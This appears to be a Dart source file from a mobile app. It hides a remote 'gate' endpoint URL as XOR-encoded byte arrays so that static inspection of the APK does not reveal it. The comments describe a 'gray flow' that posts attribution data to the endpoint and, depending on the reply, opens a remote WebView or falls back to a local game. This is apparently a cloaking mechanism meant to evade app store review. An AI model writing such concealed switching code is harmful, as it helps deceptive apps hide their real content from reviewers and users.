import '../crypto/xor_pipe.dart';

// ============================================================
// Endpoint bundle — obfuscated config endpoint URL.
// ============================================================
// The gray flow POSTs the merged attribution body to this endpoint and
// receives either { ok: true, url: ... } (WebView) or { ok: false }
// (fall back to the local game).
//
// The URL is stored as two additive byte streams (host + path) so it
// never appears verbatim in `strings apk`.  Regenerate the arrays with
// `dart run tool/encode_secrets.dart` any time the seed in
// lib/crypto/xor_pipe.dart is rotated.
// ============================================================

/// Full config endpoint (host + path joined).
String resolveGateEndpoint() {
  const host = <int>[
    0xf0, 0x92, 0xfe, 0x0f, 0x64, 0x64, 0xc0, 0xee, 0x03, 0x6c, 0x39, 0x04,
    0x95, 0x4a, 0xb1, 0x7f, 0xc8, 0xa2, 0xc3,
  ];
  const path = <int>[
    0xb7, 0x81, 0xf9, 0x0d, 0x57, 0x93, 0xf8, 0xed, 0x0b, 0x6f, 0x3b,
  ];
  if (host.isEmpty || path.isEmpty) return '';
  return unwind(host) + unwind(path);
}
